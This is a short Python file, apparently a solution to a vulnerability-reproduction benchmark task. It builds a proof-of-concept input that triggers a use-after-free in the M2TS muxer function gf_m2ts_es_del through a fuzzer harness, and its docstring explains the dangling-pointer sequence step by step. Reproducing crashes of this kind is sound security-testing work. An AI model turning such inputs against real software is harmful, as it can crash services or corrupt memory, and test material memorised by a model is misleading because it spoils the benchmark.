import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a use-after-free in `gf_m2ts_es_del`, triggered
        via the M2TS muxer fuzzer harness. The harness takes a text-based
        configuration followed by binary data.

        The sequence to trigger the UAF is:
        1. Create two elementary streams (ES), es1 and es2.
        2. Process a data packet for es1. This sets an internal pointer,
           `ts->last_es`, to point to es1.
        3. Use the 'es_opts' command with the 'saps' option on es1. This
           causes es1 to be deleted, but the `ts->last_es` pointer is not
           cleared, making it a dangling pointer.
        4. Process a data packet for es2. The processing function
           `gf_m2ts_mux_add_pes_packet` first accesses `ts->last_es`
           (dereferencing the dangling pointer), triggering the UAF.

        The PoC consists of a series of text commands followed by the
        concatenated binary data required by the `process` commands.
        """
        
        commands = [
            b"new_es pid=1 stream_type=0",    # 1. Create es1 (pid=1)
            b"new_es pid=2 stream_type=0",    # 1. Create es2 (pid=2)
            b"process data_size=1 pid=1",     # 2. Process for es1, sets last_es = es1
            b"es_opts pid=1 saps",            # 3. Delete es1, last_es becomes dangling
            b"process data_size=1 pid=2",     # 4. Process for es2, triggers UAF on last_es
        ]
        
        # Join commands with newlines. A final newline separates the text
        # part from the binary data part.
        text_part = b'\n'.join(commands) + b'\n'

        # Binary data for the two `process` calls. The content does not matter.
        # One byte for the first 'process', one for the second.
        binary_part = b'\x00' * 2

        poc = text_part + binary_part
        return poc